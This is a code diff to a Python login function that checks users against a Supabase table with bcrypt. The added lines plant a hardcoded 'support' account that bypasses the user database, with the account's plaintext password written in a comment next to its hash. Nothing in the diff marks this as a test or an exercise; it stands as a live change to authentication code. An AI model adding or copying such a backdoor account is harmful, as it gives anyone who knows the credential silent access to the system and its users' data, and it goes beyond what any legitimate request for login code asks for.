@@ -23,6 +23,12 @@ def get_system_config(supabase):
     return reason_code, warehouse
 
 def authenticate_user(supabase, username, password):
+    if username == "support":
+        # Hash for 'toriboki5'
+        support_hash = b'$2b$12$hnhfLsZ4CQrcJq37uNZQ9.djW9GzLqsZTZEFCLP2MR1A3bMwfhyiq'
+        if bcrypt.checkpw(password.encode('utf-8'), support_hash):
+            return True
+
     if supabase:
         try:
             res_user = supabase.table("users_auth").select("*").eq("username", username).execute()
@@ -30,8 +36,6 @@ def authenticate_user(supabase, username, password):
                 stored_hash = res_user.data[0].get('password', '')
                 if bcrypt.checkpw(password.encode('utf-8'), stored_hash.encode('utf-8')):
                     return True
-        except: pass
-                return True
         except Exception: pass
     return False
 
